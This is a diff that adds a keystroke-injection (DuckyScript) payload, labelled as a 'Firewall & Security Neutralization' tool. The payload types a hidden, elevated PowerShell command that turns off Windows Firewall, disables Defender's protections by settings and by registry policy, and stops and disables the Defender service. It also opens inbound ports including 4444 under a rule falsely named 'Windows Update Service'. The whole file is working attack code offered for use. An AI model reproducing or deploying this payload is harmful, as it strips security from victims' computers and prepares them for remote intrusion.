@@ -1,0 +1,13 @@
+REM ============================================
+REM  FU PERSON | Firewall & Security Neutralization
+REM  FLLC - by PERSON FU
+REM  Time: ~10 seconds | Stealth: LOW
+REM  Disables firewall, opens ports, stops AV
+REM  Requires: Admin (UAC bypass attempt)
+REM ============================================
+DELAY 500
+GUI r
+DELAY 400
+STRING powershell -w hidden -ep bypass -c "Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList '-ep bypass -c \"netsh advfirewall set allprofiles state off;Set-MpPreference -DisableRealtimeMonitoring 1 -DisableBehaviorMonitoring 1 -DisableIOAVProtection 1 -DisableScriptScanning 1 2>$null;New-NetFirewallRule -DisplayName \\\"Windows Update Service\\\" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4444,8080,8443,9001 -ea 0;Set-NetFirewallProfile -All -Enabled False -ea 0;reg add \\\"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\\\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>$null;sc stop WinDefend 2>$null;sc config WinDefend start=disabled 2>$null;\\\"Done\\\"|Out-File $env:TEMP\fw_done.txt\"'"
+ENTER
+DELAY 500
